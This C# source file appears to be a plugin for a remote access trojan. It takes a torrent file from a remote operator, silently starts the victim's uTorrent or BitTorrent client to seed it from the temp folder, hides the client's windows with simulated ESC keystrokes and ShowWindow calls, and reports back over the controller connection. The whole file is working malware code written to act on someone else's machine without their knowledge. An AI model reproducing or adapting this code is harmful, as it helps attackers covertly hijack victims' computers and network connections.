using Plugin;
using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Miscellaneous.Handler
{
    public class HandleTorrent
    {
        public HandleTorrent(MsgPack unpack_msgpack)
        {
            switch (unpack_msgpack.ForcePathObject("Option").AsString)
            {
                case "seed":
                    {
                        Seed(unpack_msgpack.ForcePathObject("File").GetAsBytes());
                        break;
                    }

                case "cancelSeed":
                    {

                        break;
                    }

                case "installClient":
                    {

                        break;
                    }
            }
        }

        private void Seed(byte[] file)
        {
            try
            {
                string torrentFilePath = Path.GetTempFileName() + ".torrent";
                File.WriteAllBytes(torrentFilePath, file);
                string client = IsInstalled();
                if (client == null)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "Error";
                    msgpack.ForcePathObject("Error").AsString = "couldn't find a torrent client";
                    Connection.Send(msgpack.Encode2Bytes());
                    return;
                }
                else
                {
                    using (Process p = new Process())
                    {
                        p.StartInfo.FileName = client;
                        p.StartInfo.Arguments = "/DIRECTORY " + Path.GetTempPath() + " \"" + torrentFilePath + "\"";
                        p.StartInfo.CreateNoWindow = true;
                        p.Start();
                    }

                    Stopwatch stopwatch = new Stopwatch();
                    stopwatch.Start();
                    while (stopwatch.Elapsed < TimeSpan.FromSeconds(5))
                    {
                        Thread.Sleep(1);
                        foreach (Process p in Process.GetProcesses())
                        {
                            try
                            {
                                IntPtr hWnd = p.MainWindowHandle;
                                if (p.MainModule.FileName == client && IsWindowVisible(hWnd))
                                {
                                    SendKeys.SendWait("{ESC}");
                                    Thread.Sleep(10);
                                    ShowWindow(hWnd, 0);
                                }
                            }
                            catch { }
                        }
                    }
                    stopwatch.Stop();
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "Logs";
                    msgpack.ForcePathObject("Message").AsString = $"seeding using {Path.GetFileName(IsInstalled())}";
                    Connection.Send(msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        private string IsInstalled()
        {
            string uTorrent = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\uTorrent\\uTorrent.exe";
            string bitTorrent = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BitTorrent\\BitTorrent.exe";
            if (File.Exists(uTorrent))
            {
                return uTorrent;
            }
            else if (File.Exists(bitTorrent))
            {
                return bitTorrent;
            }
            else
            {
                return null;
            }
        }


        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWindowVisible(IntPtr hWnd);

    }

}
